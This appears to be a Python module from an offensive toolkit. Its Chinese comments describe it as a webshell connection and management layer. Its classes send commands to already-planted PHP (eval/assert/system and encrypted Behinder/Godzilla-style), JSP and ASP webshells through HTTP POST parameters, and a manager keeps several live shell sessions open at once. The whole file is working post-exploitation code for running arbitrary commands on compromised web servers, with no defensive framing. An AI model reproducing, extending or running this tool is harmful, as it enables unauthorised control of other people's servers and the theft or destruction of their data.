"""
WebShell连接和通信模块
提供统一的WebShell管理接口
"""
import base64
from abc import ABC, abstractmethod
from typing import Dict, Optional, Tuple, Union
from urllib.parse import urlparse

import requests
import requests.exceptions

try:
    from .config import Config
    from .logger import Logger
except ImportError:
    from config import Config
    from logger import Logger


class WebShellError(Exception):
    """WebShell基础异常"""
    pass


class ConnectionError(WebShellError):
    """连接错误"""
    pass


class ExecutionError(WebShellError):
    """执行错误"""
    pass


class UnsupportedShellError(WebShellError):
    """不支持的Shell类型"""
    pass


class WebShell(ABC):
    """
    WebShell抽象基类
    定义所有WebShell类型的统一接口
    """
    
    def __init__(
        self,
        url: str,
        password: str,
        config: Optional[Config] = None,
        logger: Optional[Logger] = None
    ):
        """
        初始化WebShell
        
        Args:
            url: WebShell URL地址
            password: WebShell密码/参数名
            config: 配置对象
            logger: 日志对象
        """
        self._validate_url(url)
        
        self.url = url
        self.password = password
        self.config = config or Config()
        self.logger = logger or Logger()
        
        self._session = self._create_session()
        self._timeout = self.config.get('timeout', 10)
        self._encoding = self.config.get('encoding', 'utf-8')
    
    @staticmethod
    def _validate_url(url: str) -> None:
        """验证URL格式"""
        try:
            result = urlparse(url)
            if not all([result.scheme, result.netloc]):
                raise ValueError(f"Invalid URL: {url}")
        except Exception as e:
            raise ValueError(f"URL validation failed: {e}")
    
    def _create_session(self) -> requests.Session:
        """创建并配置HTTP会话"""
        session = requests.Session()
        
        # 设置请求头
        headers = self.config.get('headers', {})
        if headers:
            session.headers.update(headers)
        
        # 设置代理
        proxy = self.config.get('proxy')
        if proxy:
            session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        return session
    
    @abstractmethod
    def execute(self, command: str) -> Tuple[bool, str]:
        """
        执行命令
        
        Args:
            command: 要执行的命令
            
        Returns:
            Tuple[bool, str]: (是否成功, 结果/错误信息)
        """
        pass
    
    def _send_request(
        self,
        data: Dict[str, Union[str, bytes]],
        method: str = 'POST'
    ) -> Tuple[bool, str]:
        """
        发送HTTP请求
        
        Args:
            data: 请求数据
            method: HTTP方法
            
        Returns:
            Tuple[bool, str]: (是否成功, 响应内容/错误信息)
        """
        try:
            if method.upper() == 'POST':
                response = self._session.post(
                    self.url,
                    data=data,
                    timeout=self._timeout
                )
            else:
                response = self._session.get(
                    self.url,
                    params=data,
                    timeout=self._timeout
                )
            
            response.encoding = self._encoding
            return True, response.text
            
        except requests.exceptions.Timeout:
            return False, "Request timeout"
        except requests.exceptions.ConnectionError as e:
            return False, f"Connection error: {e}"
        except requests.exceptions.RequestException as e:
            return False, f"Request failed: {e}"
    
    def close(self) -> None:
        """关闭会话"""
        self._session.close()


class PHPWebShell(WebShell):
    """
    PHP一句话木马
    支持eval、assert、system等类型
    """
    
    VALID_TYPES = {'eval', 'assert', 'system'}
    
    def __init__(
        self,
        url: str,
        password: str,
        shell_type: str = 'eval',
        config: Optional[Config] = None,
        logger: Optional[Logger] = None
    ):
        """
        初始化PHP WebShell
        
        Args:
            url: WebShell URL
            password: 密码参数名
            shell_type: Shell类型 (eval/assert/system)
            config: 配置对象
            logger: 日志对象
        """
        super().__init__(url, password, config, logger)
        
        if shell_type not in self.VALID_TYPES:
            raise UnsupportedShellError(
                f"Invalid PHP shell type: {shell_type}. "
                f"Valid types: {self.VALID_TYPES}"
            )
        
        self.shell_type = shell_type
    
    def execute(self, command: str) -> Tuple[bool, str]:
        """执行系统命令"""
        if self.shell_type in ('eval', 'assert'):
            php_code = f'system("{command}");'
        else:  # system
            php_code = command
        
        return self._send_request({self.password: php_code})
    
    def execute_php(self, php_code: str) -> Tuple[bool, str]:
        """
        执行PHP代码
        
        Args:
            php_code: PHP代码字符串
            
        Returns:
            Tuple[bool, str]: (是否成功, 结果)
        """
        if self.shell_type not in ('eval', 'assert'):
            return False, "PHP code execution not supported for system type"
        
        return self._send_request({self.password: php_code})


class CustomPHPWebShell(WebShell):
    """
    自定义加密PHP WebShell
    如冰蝎、哥斯拉等
    """
    
    def __init__(
        self,
        url: str,
        password: str,
        config: Optional[Config] = None,
        logger: Optional[Logger] = None
    ):
        super().__init__(url, password, config, logger)
        self._key: Optional[bytes] = None
    
    def _encrypt(self, data: str) -> str:
        """加密数据（默认base64，可重写）"""
        return base64.b64encode(data.encode()).decode()
    
    def _decrypt(self, data: str) -> str:
        """解密数据"""
        try:
            return base64.b64decode(data.encode()).decode()
        except Exception:
            return data
    
    def execute(self, command: str) -> Tuple[bool, str]:
        """执行命令"""
        payload = self._encrypt(f'system("{command}");')
        success, response = self._send_request({self.password: payload})
        
        if success:
            return True, self._decrypt(response)
        return False, response


class JSPWebShell(WebShell):
    """JSP WebShell"""
    
    def execute(self, command: str) -> Tuple[bool, str]:
        """执行命令（使用Runtime.exec）"""
        return self._send_request({self.password: command})


class ASPWebShell(WebShell):
    """
    ASP/ASPX WebShell
    支持execute类型的VBScript执行
    """
    
    def execute(self, command: str) -> Tuple[bool, str]:
        """
        执行系统命令
        使用WScript.Shell执行命令并获取输出
        """
        vbscript = f'''
        On Error Resume Next
        Set shell = Server.CreateObject("WScript.Shell")
        Set exec = shell.Exec("{command}")
        If Err.Number <> 0 Then
            Response.Write("Error: " & Err.Description)
        Else
            Response.Write(exec.StdOut.ReadAll)
        End If
        '''
        return self._send_request({self.password: vbscript})
    
    def execute_vbscript(self, vbscript: str) -> Tuple[bool, str]:
        """
        直接执行VBScript代码
        
        Args:
            vbscript: VBScript代码
            
        Returns:
            Tuple[bool, str]: (是否成功, 结果)
        """
        return self._send_request({self.password: vbscript})


class WebShellManager:
    """
    WebShell管理器
    管理多个WebShell连接
    """
    
    SHELL_REGISTRY = {
        'php-eval': lambda url, pwd, cfg, log: PHPWebShell(
            url, pwd, 'eval', cfg, log
        ),
        'php-assert': lambda url, pwd, cfg, log: PHPWebShell(
            url, pwd, 'assert', cfg, log
        ),
        'php-system': lambda url, pwd, cfg, log: PHPWebShell(
            url, pwd, 'system', cfg, log
        ),
        'php-custom': CustomPHPWebShell,
        'jsp': JSPWebShell,
        'asp': ASPWebShell,
    }
    
    def __init__(
        self,
        config: Optional[Config] = None,
        logger: Optional[Logger] = None
    ):
        """
        初始化管理器
        
        Args:
            config: 配置对象
            logger: 日志对象
        """
        self.config = config or Config()
        self.logger = logger or Logger()
        self._shells: Dict[str, WebShell] = {}
    
    @property
    def shells(self) -> Dict[str, WebShell]:
        """获取所有连接（只读）"""
        return self._shells.copy()
    
    def connect(
        self,
        name: str,
        url: str,
        password: str,
        shell_type: str = 'php-eval'
    ) -> bool:
        """
        连接WebShell
        
        Args:
            name: 连接名称
            url: WebShell URL
            password: 密码
            shell_type: Shell类型
            
        Returns:
            bool: 是否成功
        """
        if shell_type not in self.SHELL_REGISTRY:
            self.logger.error(f"Unsupported shell type: {shell_type}")
            return False
        
        try:
            factory = self.SHELL_REGISTRY[shell_type]
            shell = factory(url, password, self.config, self.logger)
            
            # 测试连接
            success, _ = shell.execute('echo test')
            
            self._shells[name] = shell
            self.logger.success(f"Connected to {name} ({url})")
            return True
            
        except Exception as e:
            self.logger.error(f"Connection failed: {e}")
            return False
    
    def disconnect(self, name: str) -> bool:
        """
        断开连接
        
        Args:
            name: 连接名称
            
        Returns:
            bool: 是否成功
        """
        if name not in self._shells:
            return False
        
        shell = self._shells.pop(name)
        shell.close()
        self.logger.info(f"Disconnected from {name}")
        return True
    
    def get_shell(self, name: str) -> Optional[WebShell]:
        """
        获取Shell实例
        
        Args:
            name: 连接名称
            
        Returns:
            WebShell实例或None
        """
        return self._shells.get(name)
    
    def list_shells(self) -> Dict[str, str]:
        """
        列出所有连接
        
        Returns:
            Dict[str, str]: {名称: URL}
        """
        return {name: shell.url for name, shell in self._shells.items()}
    
    def disconnect_all(self) -> None:
        """断开所有连接"""
        for name in list(self._shells.keys()):
            self.disconnect(name)
